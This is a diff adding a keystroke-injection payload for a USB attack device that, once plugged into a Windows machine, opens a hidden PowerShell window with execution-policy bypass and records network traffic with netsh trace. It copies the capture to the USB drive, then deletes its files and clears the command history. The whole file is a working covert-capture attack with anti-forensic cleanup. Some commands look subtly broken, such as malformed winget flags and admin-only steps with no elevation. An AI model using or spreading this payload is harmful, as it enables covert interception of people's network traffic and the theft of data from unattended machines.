@@ -1,0 +1,57 @@
+# ============================================
+# WINDOWS NETWORK SNIFF - USB Ethernet
+# ============================================
+# Purpose: Capture network traffic via USB interface
+# Requires: USB Army Knife with Ethernet emulation
+# Time: Continuous
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 3000
+
+# Start packet capture (needs admin)
+STRING $td = "$env:TEMP\.pcap"; md $td -Force
+ENTER
+DELAY 200
+
+# Install npcap if needed (silent)
+STRING # winget install npcap -e --accept-source agreements --accept-package agreements 2>$null
+ENTER
+DELAY 500
+
+# Use built-in netsh trace
+STRING netsh trace start capture=yes tracefile="$td\capture.etl" maxsize=512
+ENTER
+DELAY 1000
+
+# Wait for capture (or USB removal detection)
+STRING Start-Sleep -Seconds 300
+ENTER
+DELAY 100
+
+# Copy to USB
+STRING if (Test-Path E:\) { 
+ENTER
+STRING   Stop-Service npcap 2>$null
+ENTER
+STRING   Copy-Item "$td\capture.etl" "E:\capture.etl" -Force
+ENTER
+STRING }
+ENTER
+DELAY 500
+
+# Stop trace
+STRING netsh trace stop
+ENTER
+DELAY 500
+
+STRING Remove-Item $td -Recurse -Force
+ENTER
+STRING Clear-History; exit
+ENTER
